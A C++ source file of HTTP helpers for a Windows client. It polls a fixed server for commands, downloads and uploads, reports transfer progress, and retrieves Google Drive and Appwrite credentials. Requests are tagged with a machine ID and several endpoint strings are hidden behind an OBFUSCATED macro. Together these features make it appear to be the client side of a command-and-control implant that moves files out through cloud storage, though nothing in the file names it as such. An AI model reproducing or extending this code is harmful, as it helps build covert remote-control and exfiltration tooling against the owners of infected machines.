#include "HttpUtil.h"
#include "App.h"
#include "map"
std::map<string, string> getDefaultHeaders()
{
    std::map<string, string> headers;
    headers["X-CLIENT"] = GetMachineID();
    headers["X-APP-TYPE"] = "client";
    return headers;
}
std::vector<app::Download> fetchDownloads(int64_t fromTime)
{
    std::vector<app::Download> res;
    std::string uri = SERVER_BASE + "/download";
    if (fromTime > 0)
    {
        uri += "?fromTime=" + std::to_string(fromTime);
    }
    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::PageResult pageRes;
            app::from_json(data.get_data(), pageRes);
            if (!pageRes.get_data().empty())
            {
                for (auto &el : pageRes.get_data())
                {
                    try
                    {
                        app::Download entry;
                        app::from_json(el, entry);
                        res.push_back(el);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
            }
        }
    }
    return res;
}
std::vector<app::Upload> fetchUploads(int64_t fromTime)
{
    std::vector<app::Upload> res;
    std::string uri = SERVER_BASE + "/upload";
    if (fromTime > 0)
    {
        uri += "?fromTime=" + std::to_string(fromTime);
    }
    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::PageResult pageRes;
            app::from_json(data.get_data(), pageRes);
            if (!pageRes.get_data().empty())
            {

                for (auto &el : pageRes.get_data())
                {
                    try
                    {
                        app::Upload entry;
                        app::from_json(el, entry);
                        res.push_back(el);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
            }
        }
    }

    return res;
}
bool postUploadProgress(app::UploadProgress progress){

    json data;
    app::to_json(data,progress);
    std::string dataStr=data.dump();
    CURL *curl = curl_easy_init();
    struct curl_slist *headerlist = curl_slist_append(NULL, "Content-Type: application/json");
    auto defHeaders=getDefaultHeaders();
    for (auto &entry : defHeaders)
    {
        std::string header=entry.first+": "+entry.second;
        headerlist = curl_slist_append(NULL, header.c_str());
    }
    
    std::string link = SERVER_BASE + OBFUSCATED("/upload_progress");
    curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, dataStr.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);

    auto res = curl_easy_perform(curl);
    curl_slist_free_all(headerlist);

    long http_code = 0;
    
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(curl);
    return res == CURLE_OK && (http_code >= 200 && http_code < 300);
}
bool postDownloadProgress(app::DownloadProgress progress){

    json data;
    app::to_json(data,progress);
    std::string dataStr=data.dump();
    CURL *curl = curl_easy_init();
    struct curl_slist *headerlist = curl_slist_append(NULL, "Content-Type: application/json");
    auto defHeaders=getDefaultHeaders();
    for (auto &entry : defHeaders)
    {
        std::string header=entry.first+": "+entry.second;
        headerlist = curl_slist_append(NULL, header.c_str());
    }
    
    std::string link = SERVER_BASE + OBFUSCATED("/download_progress");
    curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, dataStr.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);

    auto res = curl_easy_perform(curl);
    curl_slist_free_all(headerlist);

    long http_code = 0;

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(curl);
    return res == CURLE_OK && (http_code >= 200 && http_code < 300);
}
std::vector<app::AppwriteDrive> fetchAppwriteDrives()
{
    std::vector<app::AppwriteDrive> res;
    std::string uri = SERVER_BASE + "/appwrite";

    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::PageResult pageRes;
            app::from_json(data.get_data(), pageRes);
            if (!pageRes.get_data().empty())
            {

                for (auto &el : pageRes.get_data())
                {
                    try
                    {
                        app::AppwriteDrive entry;
                        app::from_json(el, entry);
                        res.push_back(el);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
            }
        }
    }

    return res;
}
std::vector<app::GoogleDrive> fetchGoogleDrives()
{
    std::vector<app::GoogleDrive> res;
    std::string uri = SERVER_BASE + "/gdrive";

    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::PageResult pageRes;
            app::from_json(data.get_data(), pageRes);
            if (!pageRes.get_data().empty())
            {

                for (auto &el : pageRes.get_data())
                {
                    try
                    {
                        app::GoogleDrive entry;
                        app::from_json(el, entry);
                        res.push_back(el);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
            }
        }
    }

    return res;
}
std::shared_ptr<app::GoogleDrive> fetchGoogleDrive(std::string driveId)
{
    std::shared_ptr<app::GoogleDrive> res;
    std::string uri = SERVER_BASE + "/gdrive";
    uri += "/" + driveId;

    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::GoogleDrive drive;
            app::from_json(data.get_data(), drive);
            res = std::make_shared<app::GoogleDrive>(drive);
        }
    }

    return res;
}
std::shared_ptr<app::Client> fetchClient(std::string clientId)
{
    std::shared_ptr<app::Client> res;
    std::string uri = SERVER_BASE + "/client";
    uri += "/" + clientId;

    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::Client client;
            app::from_json(data.get_data(), client);
            res = std::make_shared<app::Client>(client);
        }
    }

    return res;
}
std::shared_ptr<app::AppwriteDrive> fetchAppwriteDrive(std::string driveId)
{
    std::shared_ptr<app::AppwriteDrive> res;
    std::string uri = SERVER_BASE + OBFUSCATED("/appwrite");
    uri += "/" + driveId;

    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::AppwriteDrive drive;
            app::from_json(data.get_data(), drive);
            res = std::make_shared<app::AppwriteDrive>(drive);
        }
    }

    return res;
}
std::vector<app::Command> fetchCommands(int64_t fromTime)
{
    std::vector<app::Command> res;
    std::string uri = SERVER_BASE + "/command";
    if (fromTime > 0)
    {
        uri += "?fromTime=" + std::to_string(fromTime);
    }
    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            app::PageResult pageRes;
            app::from_json(data.get_data(), pageRes);
            if (!pageRes.get_data().empty())
            {

                for (auto &el : pageRes.get_data())
                {
                    try
                    {
                        app::Command entry;
                        app::from_json(el, entry);
                        res.push_back(el);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
            }
        }
    }

    return res;
}
std::vector<app::CloudDrive> fetchDrives()
{
    std::vector<app::CloudDrive> res;
    std::string uri = SERVER_BASE + "/drives";

    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse data;
        app::from_json(json::parse(resp.data), data);
        if (data.get_success())
        {
            for (auto &el : data.get_data())
            {
                try
                {
                    app::CloudDrive entry;
                    app::from_json(el, entry);
                    res.push_back(el);
                }
                catch (const std::exception &e)
                {
                    std::cerr << e.what() << '\n';
                }
            }
        }
    }

    return res;
}
std::vector<app::CloudFile> fetchCloudApps(std::string googleDriveId, int64_t fromTime)
{
    std::vector<app::CloudFile> res;
    std::string uri = SERVER_BASE + "/gdrive/apps/list/";
    uri += googleDriveId;
    if (fromTime > 0)
    {
        uri += "?fromTime=" + std::to_string(fromTime);
    }
    std::map<string, string> headers = getDefaultHeaders();
    auto resp = GetBytesFromURL(uri, headers);
    if (resp.status >= 200 && resp.status < 300)
    {
        app::JsonResponse resMessage;
        app::from_json(json::parse(resp.data), resMessage);
        if (resMessage.get_success())
        {
            auto data = resMessage.get_data();

            for (auto &el : data)
            {
                try
                {
                    app::CloudFile entry;
                    app::from_json(el, entry);
                    res.push_back(el);
                }
                catch (const std::exception &e)
                {
                    std::cerr << e.what() << '\n';
                }
            }
        }
    }

    return res;
}

std::string GetGDriveToken(std::string driveId)
{
    std::string result;
    std::string tokenURL = SERVER_BASE + OBFUSCATED("/gdrive/token/") + driveId;
    auto resp = GetBytesFromURL(tokenURL, getDefaultHeaders());
    int errCount = 0;
    while (!(resp.status >= 200 && resp.status < 300) && errCount < 5)
    {
        errCount++;
        Sleep(2000);
        resp = GetBytesFromURL(tokenURL, getDefaultHeaders());
    }
    if (resp.status >= 200 && resp.status < 300)
    {
        std::map<std::string, std::string> headers;
        std::string tokResp = VecToString(resp.data);

        app::JsonResponse jResp;
        auto jparsed = json::parse(tokResp);
        app::from_json(jparsed, jResp);

        app::TokenResponse tResp;
        app::from_json(json::parse(jResp.get_data().get<std::string>()), tResp);

        result = tResp.get_access_token();
    }

    return result;
}